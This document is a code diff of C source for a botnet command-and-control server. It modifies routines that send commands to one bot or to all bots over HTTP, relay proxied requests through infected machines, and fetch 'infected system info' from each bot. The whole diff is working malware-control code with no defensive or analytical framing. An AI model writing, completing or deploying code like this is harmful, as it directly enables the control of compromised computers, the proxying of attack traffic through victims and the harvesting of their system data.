@@ -128,11 +128,9 @@ void parent(/*int pid*/)
                     getTargetIp(target_ip);
                 }
 
-
                 printf("\n Do you want to send command to all botnet or to a specific bot? [A,s] \n");
                 fgets(broadcast, sizeof(char) * 3, stdin);
                 fflush(stdin);
-
 
                 if (strcmp(broadcast, "s\n") != 0)
                 {
@@ -237,7 +235,7 @@ void sendCommand(char *command, int bot_id, char *target_ip)
 
         printf("Updating bot info\n");
         if (strcmp(target_ip, "self") == 0)
-        {   
+        {
             updateBotInfo(bot_id, bot_ip, command);
         }
         else
@@ -252,7 +250,7 @@ void sendCommand(char *command, int bot_id, char *target_ip)
 
         strcat(url, bot_ip);
 
-        printf("%s",url);
+        printf("%s", url);
         curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
         //! for each command you need to update bot info about action and target
         if (strcmp(command, HTTP_REQ) == 0)
@@ -323,25 +321,27 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     if (endpoint != NULL)
     {
 
-        printf("\nBotnet : ");
+        printf("Botnet :\n");
         list_botnet(1);
 
-        printf("\nBot completed its task...");
-        int ID = getBotID(bot_ip, bot_port);
+        printf("Bot completed its task... \n");
+        int ID = 0;
+        getBotID(bot_ip, bot_port,&ID);
+
+
         if (ID == -1)
         {
-            printf("\nBOT %s:%s not present in botnet", bot_ip, bot_port);
+            printf("BOT %s:%s not present in botnet\n", bot_ip, bot_port);
         }
         else
         {
-
             updateBotInfo(ID, "void", "void");
         }
 
         endpoint = NULL;
     }
 
-    printf("\nBotnet updated: ");
+    printf("Botnet updated:\n");
     list_botnet(1);
 
     MHD_destroy_response(response);
@@ -352,20 +352,103 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
 void broadcastCommand(char *command, char *target_ip)
 {
 
-    
+    CURL *curl;
 
-    active_bots *bot = botnet;
+    curl = curl_easy_init();
 
-    while (bot != NULL)
+    if (curl == NULL)
+        handle_error("Could not execute command, error initializing curl handle");
+    else
     {
-        if(bot->bot_id == 0) {
+
+        CURLcode res;
+
+        char url[255] = {0};
+        char request[MAX_REQ_SIZE];
+        char *new_url ;
+
+        char bot_ip[INET_ADDRSTRLEN] = {0};
+        long bot_port;
+
+        active_bots *bot = botnet;
+
+        while (bot != NULL)
+        {
+            if (bot->bot_id == 0)
+            {
+                bot = bot->next;
+                continue;
+            }
+            ret = setBotInfo(&bot_port, bot_ip, bot->bot_id);
+            if (ret < 0)
+            {
+                printf("\nCould not set bot info");
+                return;
+            }
+
+            printf("Updating bot info\n");
+            if (strcmp(target_ip, "self") == 0)
+            {
+                updateBotInfo(bot->bot_id, bot_ip, command);
+            }
+            else
+            {
+                updateBotInfo(bot->bot_id, target_ip, command);
+            }
+
             bot = bot->next;
-            continue;
         }
-        sendCommand(command, bot->bot_id, target_ip);
-        bot = bot->next;
+
+        // * BUILDING REQUEST
+
+        strcpy(url, PROTOCOL);
+
+        strcat(url, bot_ip);
+
+        // printf("%s", url);
+
+        if (strcmp(command, HTTP_REQ) == 0)
+        {
+
+            printf("\nInsert request to proxy : ");
+            scanf("%s", request);
+            new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
+            memcpy(new_url, url, sizeof(url));
+            strcat(new_url, HTTP_REQ_ENDPOINT);
+            strcat(new_url, request);
+            curl_easy_setopt(curl, CURLOPT_URL, new_url);
+
+            printf("\nSending request:  %s ", new_url);
+        }
+
+        if (strcmp(command, SYS_INFO) == 0)
+        {
+            printf("\nRetrieving infected system info");
+
+            strcat(url, "/sys_info");
+            curl_easy_setopt(curl, CURLOPT_URL, url);
+            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+        }
+
+        active_bots *b_http = botnet;
+
+        while (b_http != NULL)
+        {
+            if (b_http->bot_id == 0)
+            {
+                b_http = b_http->next;
+                continue;
+            }
+
+            curl_easy_setopt(curl, CURLOPT_PORT, b_http->port);
+
+            res = curl_easy_perform(curl);
+
+            b_http = b_http->next;
+        }
+        curl_easy_cleanup(curl);
+        if(strcmp(command, HTTP_REQ) == 0)
+            free(new_url);
+
     }
-
-   
-
 }
